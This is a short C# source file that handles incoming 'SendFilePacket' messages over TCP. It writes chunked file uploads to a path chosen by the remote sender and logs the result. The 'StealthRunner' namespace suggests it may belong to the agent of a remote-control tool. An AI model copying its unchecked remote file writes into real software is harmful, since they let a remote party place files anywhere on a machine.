using FlexiLeaf.Core.Network;
using FlexiLeaf.Core.Network.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FlexiLeaf.StealthRunner.Handlers
{
    internal class FilesHandlers
    {

        [PacketHandler]
        public static void ReceiveFile(SendFilePacket packet, TcpClient Client)
        {
            packet.WriteFileFromChunks();
            if (packet.CurrentChunk == packet.TotalChunk)
                Console.WriteLine("New File upload : " + Path.GetFullPath(packet.FilePath));
            //packet.Data = new byte[0];
            //await Client.Send(packet);
        }

    }
}
